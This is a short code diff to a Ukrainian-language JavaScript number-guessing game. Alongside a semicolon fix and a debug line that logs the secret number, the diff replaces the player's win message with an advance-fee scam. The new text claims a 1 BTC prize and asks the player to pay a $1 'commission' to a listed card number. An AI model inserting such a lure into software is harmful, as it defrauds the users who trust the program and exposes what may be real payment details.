@@ -21,7 +21,7 @@ function game() {
 			} else {
 			}
 		} else if (bb != a) {
-			alert('ведіть чило з правильним кроком!!!')
+			alert('ведіть чило з правильним кроком!!!');
 			const result = confirm('Продовжити гру??');
 			if (result) {
 				game();
@@ -29,12 +29,13 @@ function game() {
 			}
 		} else {
 			let want_1 = Math.floor(Math.random() * (+a - +b) + +b);
+			console.log(want_1);
 			let i = 4;
 			while (i > 0) {
 				let look = prompt(`В тебе залишилася ${i} спроби`);
 				let work = (look == want_1);
 				if (work) {
-					alert('ура ти молодець');
+					alert('Щоб забрати приз 1 btc!!! заплатіть комісію 1$. Карта: 5363542308856229');
 					const result = confirm('Продовжити гру??');
 					if (result) {
 						game();
